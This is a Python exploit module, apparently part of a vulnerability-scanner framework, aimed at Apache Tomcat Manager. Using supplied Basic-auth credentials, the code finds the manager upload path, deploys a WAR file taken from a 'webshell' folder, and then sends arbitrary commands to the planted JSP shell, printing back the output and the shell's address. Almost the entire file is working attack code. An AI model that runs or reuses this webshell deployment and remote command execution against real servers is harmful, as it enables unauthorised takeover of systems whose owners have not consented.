import re

import requests

from VulnScanModel.models import VulnScan
from .. import  fileUtil
from vulscan_Project.requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def upload_war(self, url, authorized_key):
        resp = self.requestUtil.get(url + "/manager/html", header={"Authorization": "Basic %s" % authorized_key})
        upload_path = re.findall(r'"(/manager/html/upload.*?)"', resp.text)[0]
        data = self.requestUtil.get_file_data(filename="zs.war",
                                         filedata=fileUtil.open_file(filename="zs.war", dir="webshell",
                                                                     mode="rb").read(), param="deployWar")
        resp = self.requestUtil.post(url + upload_path, data=data[0],
                                header={"Content-Type": data[1], "Authorization": "Basic %s" % authorized_key})
        return True

    def rce(self, url, cmd):
        resp = self.requestUtil.get(url + f"/zs/zs.jsp?i={cmd}")
        print(resp.text)
        if resp.status_code != 404:
            return resp.content.replace(b'\x00', b'').decode()
        else:
            return False

    def exp(self, cmd, content=""):
        result = self.rce(self.vuln.url, cmd)
        if not result:
            self.upload_war(self.vuln.url, self.vuln.specify)
            result = self.rce(self.vuln.url, cmd)
        return "shell地址: \n%s" % f"{self.vuln.url}/zs/zs.jsp\n输出结果:\n" + str(result)
